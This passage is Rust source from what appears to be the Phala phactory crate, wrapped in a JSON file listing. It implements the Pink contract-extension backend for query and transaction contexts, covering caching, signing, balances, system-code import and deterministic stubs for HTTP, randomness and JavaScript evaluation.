Result<(), Self::Error> {\n        OCallImpl.cache_set_expiration(self.address_bytes(), key.into_owned(), expire);\n        Ok(())\n    }\n\n    fn cache_get(&self, key: Cow<'_, [u8]>) -> Result<Option<Vec<u8>>, Self::Error> {\n        Ok(OCallImpl.cache_get(self.address_bytes(), key.into_owned()))\n    }\n\n    fn cache_remove(&self, key: Cow<'_, [u8]>) -> Result<Option<Vec<u8>>, Self::Error> {\n        Ok(OCallImpl.cache_remove(self.address_bytes(), key.into_owned()))\n    }\n\n    fn log(&self, level: u8, message: Cow<str>) -> Result<(), Self::Error> {\n        OCallImpl.log_to_server(self.address.clone(), level, message.as_ref().into());\n        DefaultPinkExtension::new(self).log(level, message)\n    }\n\n    fn getrandom(&self, length: u8) -> Result<Vec<u8>, Self::Error> {\n        DefaultPinkExtension::new(self).getrandom(length)\n    }\n\n    fn is_in_transaction(&self) -> Result<bool, Self::Error> {\n        Ok(false)\n    }\n\n    fn ecdsa_sign_prehashed(\n        &self,\n        key: Cow<[u8]>,\n        message_hash: Hash,\n    ) -> Result<EcdsaSignature, Self::Error> {\n        DefaultPinkExtension::new(self).ecdsa_sign_prehashed(key, message_hash)\n    }\n\n    fn ecdsa_verify_prehashed(\n        &self,\n        signature: EcdsaSignature,\n        message_hash: Hash,\n        pubkey: EcdsaPublicKey,\n    ) -> Result<bool, Self::Error> {\n        DefaultPinkExtension::new(self).ecdsa_verify_prehashed(signature, message_hash, pubkey)\n    }\n\n    fn system_contract_id(&self) -> Result<ext::AccountId, Self::Error> {\n        PalletPink::system_contract()\n            .map(|address| address.convert_to())\n            .ok_or(Error::SystemContractMissing.into())\n    }\n\n    fn balance_of(\n        &self,\n        account: ext::AccountId,\n    ) -> Result<(pink::Balance, pink::Balance), Self::Error> {\n        self.ensure_system()?;\n        let account: AccountId32 = account.convert_to();\n        let total = crate::runtime::Balances::total_balance(&account);\n        let free = crate::runtime::Balances::free_balance(&account);\n        Ok((total, free))\n    }\n\n    fn untrusted_millis_since_unix_epoch(&self) -> Result<u64, Self::Error> {\n        DefaultPinkExtension::new(self).untrusted_millis_since_unix_epoch()\n    }\n\n    fn worker_pubkey(&self) -> Result<EcdhPublicKey, Self::Error> {\n        Ok(OCallImpl.worker_pubkey())\n    }\n\n    fn code_exists(&self, code_hash: Hash, sidevm: bool) -> Result<bool, Self::Error> {\n        if sidevm {\n            Ok(PalletPink::sidevm_code_exists(&code_hash.into()))\n        } else {\n            Ok(crate::storage::external_backend::code_exists(\n                &code_hash.into(),\n            ))\n        }\n    }\n\n    fn import_latest_system_code(\n        &self,\n        payer: ext::AccountId,\n    ) -> Result<Option<Hash>, Self::Error> {\n        self.ensure_system()?;\n        let system_code = OCallImpl.latest_system_code();\n        if system_code.is_empty() {\n            return Ok(None);\n        }\n        let code_hash = sp_core::blake2_256(&system_code);\n        if !self.code_exists(code_hash, false)? {\n            crate::runtime::Contracts::bare_upload_code(\n                payer.convert_to(),\n                system_code,\n                None,\n                pallet_contracts::Determinism::Enforced,\n            )?;\n        };\n        Ok(Some(code_hash))\n    }\n\n    fn runtime_version(&self) -> Result<(u32, u32), Self::Error> {\n        Ok(crate::version())\n    }\n\n    fn current_event_chain_head(&self) -> Result<(u64, Hash), Self::Error> {\n        Ok((\n            PalletPink::next_event_block_number(),\n            PalletPink::last_event_block_hash().into(),\n        ))\n    }\n\n    fn js_eval(&self, codes: Vec<JsCode>, args: Vec<String>) -> Result<JsValue, Self::Error> {\n        Ok(OCallImpl.js_eval(self.address.clone(), codes, args))\n    }\n\n    fn worker_sgx_quote(&self) -> Result<Option<SgxQuote>, Self::Error> {\n        Ok(OCallImpl.worker_sgx_quote())\n    }\n}\n\nstruct CallInCommand {\n    as_in_query: CallInQuery,\n}\n\n/// This implementation is used when calling the extension in a command.\n/// # NOTE FOR IMPLEMENTORS\n/// Make sure the return values are deterministic.\nimpl PinkExtBackend for CallInCommand {\n    type Error = DispatchError;\n\n    fn http_request(&self, _request: HttpRequest) -> Result<HttpResponse, Self::Error> {\n        Ok(HttpResponse {\n            status_code: 523,\n            reason_phrase: \"API Unavailable\".into(),\n            headers: vec![],\n            body: b\"HTTP request is not supported in transaction\".to_vec(),\n        })\n    }\n    fn batch_http_request(\n        &self,\n        _requests: Vec<ext::HttpRequest>,\n        _timeout_ms: u64,\n    ) -> Result<ext::BatchHttpResult, Self::Error> {\n        Ok(Err(ext::HttpRequestError::NotAllowed))\n    }\n    fn sign(\n        &self,\n        sigtype: SigType,\n        key: Cow<[u8]>,\n        message: Cow<[u8]>,\n    ) -> Result<Vec<u8>, Self::Error> {\n        if matches!(sigtype, SigType::Sr25519) {\n            return Ok(vec![]);\n        }\n        self.as_in_query.sign(sigtype, key, message)\n    }\n\n    fn verify(\n        &self,\n        sigtype: SigType,\n        pubkey: Cow<[u8]>,\n        message: Cow<[u8]>,\n        signature: Cow<[u8]>,\n    ) -> Result<bool, Self::Error> {\n        self.as_in_query.verify(sigtype, pubkey, message, signature)\n    }\n\n    fn derive_sr25519_key(&self, salt: Cow<[u8]>) -> Result<Vec<u8>, Self::Error> {\n        self.as_in_query.derive_sr25519_key(salt)\n    }\n\n    fn get_public_key(&self, sigtype: SigType, key: Cow<[u8]>) -> Result<Vec<u8>, Self::Error> {\n        self.as_in_query.get_public_key(sigtype, key)\n    }\n\n    fn cache_set(\n        &self,\n        key: Cow<[u8]>,\n        value: Cow<[u8]>,\n    ) -> Result<Result<(), StorageQuotaExceeded>, Self::Error> {\n        deposit_pink_event(\n            self.as_in_query.address.clone(),\n            PinkEvent::CacheOp(CacheOp::Set {\n                key: key.into_owned(),\n                value: value.into_owned(),\n            }),\n        );\n        Ok(Ok(()))\n    }\n\n    fn cache_set_expiration(&self, key: Cow<[u8]>, expiration: u64) -> Result<(), Self::Error> {\n        deposit_pink_event(\n            self.as_in_query.address.clone(),\n            PinkEvent::CacheOp(CacheOp::SetExpiration {\n                key: key.into_owned(),\n                expiration,\n            }),\n        );\n        Ok(())\n    }\n\n    fn cache_get(&self, _key: Cow<[u8]>) -> Result<Option<Vec<u8>>, Self::Error> {\n        Ok(None)\n    }\n\n    fn cache_remove(&self, key: Cow<[u8]>) -> Result<Option<Vec<u8>>, Self::Error> {\n        deposit_pink_event(\n            self.as_in_query.address.clone(),\n            PinkEvent::CacheOp(CacheOp::Remove {\n                key: key.into_owned(),\n            }),\n        );\n        Ok(None)\n    }\n\n    fn log(&self, level: u8, message: Cow<str>) -> Result<(), Self::Error> {\n        self.as_in_query.log(level, message)\n    }\n\n    fn getrandom(&self, _length: u8) -> Result<Vec<u8>, Self::Error> {\n        Ok(vec![])\n    }\n\n    fn is_in_transaction(&self) -> Result<bool, Self::Error> {\n        Ok(true)\n    }\n\n    fn ecdsa_sign_prehashed(\n        &self,\n        key: Cow<[u8]>,\n        message_hash: Hash,\n    ) -> Result<EcdsaSignature, Self::Error> {\n        self.as_in_query.ecdsa_sign_prehashed(key, message_hash)\n    }\n\n    fn ecdsa_verify_prehashed(\n        &self,\n        signature: EcdsaSignature,\n        message_hash: Hash,\n        pubkey: EcdsaPublicKey,\n    ) -> Result<bool, Self::Error> {\n        self.as_in_query\n            .ecdsa_verify_prehashed(signature, message_hash, pubkey)\n    }\n\n    fn system_contract_id(&self) -> Result<ext::AccountId, Self::Error> {\n        self.as_in_query.system_contract_id()\n    }\n\n    fn balance_of(\n        &self,\n        account: ext::AccountId,\n    ) -> Result<(pink::Balance, pink::Balance), Self::Error> {\n        self.as_in_query.balance_of(account)\n    }\n\n    fn untrusted_millis_since_unix_epoch(&self) -> Result<u64, Self::Error> {\n        Ok(0)\n    }\n\n    fn worker_pubkey(&self) -> Result<EcdhPublicKey, Self::Error> {\n        Ok(Default::default())\n    }\n\n    fn code_exists(&self, code_hash: Hash, sidevm: bool) -> Result<bool, Self::Error> {\n        self.as_in_query.code_exists(code_hash, sidevm)\n    }\n\n    fn import_latest_system_code(\n        &self,\n        payer: ext::AccountId,\n    ) -> Result<Option<Hash>, Self::Error> {\n        self.as_in_query.import_latest_system_code(payer)\n    }\n\n    fn runtime_version(&self) -> Result<(u32, u32), Self::Error> {\n        self.as_in_query.runtime_version()\n    }\n\n    fn current_event_chain_head(&self) -> Result<(u64, Hash), Self::Error> {\n        self.as_in_query.current_event_chain_head()\n    }\n\n    fn js_eval(&self, _code: Vec<JsCode>, _args: Vec<String>) -> Result<JsValue, Self::Error> {\n        Ok(JsValue::Exception(\n            \"Js evaluation is not supported in transaction\".into(),\n        ))\n    }\n\n    fn worker_sgx_quote(&self) -> Result<Option<SgxQuote>, Self::Error> {\n        Ok(None)\n    }\n}"
    },
    {
      "filename": "crates/phactory/src/contracts/pink.rs",
      "content": "use once_cell::sync::Lazy;\nuse sgx_attestation::SgxQuote;\nuse std::sync::Mutex;\nuse std::{convert::TryInto, time::Duration};\n\nuse crate::{\n    contracts::{self, block_on_run_module, QueryContext, TransactionContext},\n    system::{TransactionError, TransactionRe"
    }
  ]
}